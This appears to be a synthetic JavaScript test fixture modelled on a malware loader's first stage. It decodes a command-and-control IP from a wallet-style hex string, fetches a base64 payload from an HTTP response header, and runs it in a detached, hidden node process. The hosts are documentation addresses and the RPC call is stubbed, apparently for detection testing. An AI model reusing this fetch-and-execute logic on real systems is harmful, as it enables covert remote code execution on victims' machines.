// Synthetic test fixture shaped like the NullReceiver stage 1 source. Not a
// real sample: the wallet is all zeros and every address is documentation space.
global['r'] = require;
const http = require('node:http');
const { spawn } = require('node:child_process');
const BLOCK_MULTIPLE = 1000n;
const SENDER = '0x0000000000000000000000000000000000000000';
async function rpcCall(endpoint, method, params) { return null; }
function decodeAddress(to) {
  const b = Buffer.from(to.replace(/^0x/i, ''), 'hex');
  const ip = (x) => x[0] + '.' + x[1] + '.' + x[2] + '.' + x[3];
  return [ip(b.subarray(0, 4)), ip(b.subarray(4, 8))];
}
function spawnNodeScript(source) {
  const child = spawn('node', ['-i'], { detached: true, windowsHide: true, stdio: ['pipe', 'pipe', 'pipe'] });
  child.stdin.write('process.stdin.removeAllListeners("end");\n');
  child.stdin.write(source);
}
async function run() {
  const head = BigInt(await rpcCall('https://rpc.example', 'eth_blockNumber', []));
  const block = await rpcCall('https://rpc.example', 'eth_getBlockByNumber', ['0x' + (head - head % BLOCK_MULTIPLE).toString(16), true]);
  const [ip1] = decodeAddress('0xc0000202c000020268656c6c6f6970626f742121');
  const req = http.request({ hostname: ip1, port: 443, path: '/0x/cls', method: 'HEAD', headers: { 'Sec-V': 'A10' } }, (res) => {
    const b64 = res.headers['x-payload-b64'];
    if (b64) spawnNodeScript(Buffer.from(b64, 'base64').toString('utf8'));
  });
  req.end();
  http.request({ hostname: ip1, port: 443, path: '/0x/ls', method: 'GET' }).end();
}
run();
